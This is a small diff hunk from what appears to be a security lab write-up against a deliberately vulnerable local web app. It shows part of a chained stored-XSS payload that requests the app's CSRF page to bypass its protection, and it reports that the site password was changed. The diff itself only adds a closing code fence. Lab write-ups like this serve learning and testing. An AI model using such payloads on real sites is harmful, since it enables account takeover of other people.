@@ -136,6 +136,7 @@ Payload Used: Chained attack, uses inbuilt XSS Stored module to bypass CSRF prot
   req.open("GET", "[http://127.0.0.1:8080/vulnerabilities/csrf/](http://127.0.0.1:8080/vulnerabilities/csrf/)", false);
   req.send();
   </script>
+```
 
 Result: Password for the website was changed successfully.
 
